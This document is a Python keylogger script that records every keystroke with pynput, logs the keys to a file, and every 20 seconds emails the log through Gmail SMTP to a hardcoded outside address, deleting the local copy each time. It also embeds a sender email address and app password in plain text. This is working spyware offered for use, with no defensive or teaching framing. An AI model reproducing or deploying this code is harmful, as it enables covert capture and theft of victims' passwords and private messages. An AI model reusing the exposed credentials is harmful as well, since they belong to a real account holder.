import os
import time
import smtplib
import ssl
import pynput
from pynput.keyboard import Key,Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

reciver_email_address="thivankanimesh@hotmail.com"
time_gap=20
screen_shots=False
web_records=False
web_cam=False
delete_log_file=False

sender_email_address="thivankanimshan@gmail.com"
sender_email_password="jmpomhnpxzcvtfyr"
last_mail_sent_time=time.time()
port = 587

keys = []
overall_count =0

#Connect to SMTP
smtp=smtplib.SMTP('smtp.gmail.com',port)
smtp.ehlo()
smtp.starttls()
smtp.ehlo()

smtp.login(sender_email_address,sender_email_password)

def on_press(key):
    global keys    
    global overall_count
    #DEBUGGING
    print(overall_count)   
    keys.append(key)
    overall_count+=1
    write_file(key)
    sendMail()
    
def on_release(key):
    if(key==Key.esc):
        return False    

def write_file(key):
        global keys
        if(overall_count%10==0):
            file=open('log.txt','a')   
            for key in keys:
                file.write(str(key))
            file.write("\n")
            keys = []


def sendMail():

        global last_mail_sent_time
        file='log.txt'

        msg=MIMEMultipart()
        msg['Subject']='subject'
        msg['From']=sender_email_address
        msg['To']=reciver_email_address

        #DEBUGGING
        #print(time.time()-last_mail_sent_time)

        if((time.time()-last_mail_sent_time)>=time_gap):
                #Making attachment
                attachment=MIMEBase('application','octet-stream')
                attachment.set_payload(open(file,'rb').read())
                #Errace file
                os.remove('log.txt')
                attachment.add_header('Content-Disposition','attachment; filename="%s"'%os.path.basename(file))
                msg.attach(MIMEText("Labour"))
                msg.attach(attachment)
                smtp.sendmail(sender_email_address,reciver_email_address,msg.as_string())
                #Updating message sent time
                last_mail_sent_time=time.time()
                #DEBUGGIN
                print("message sent")


with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()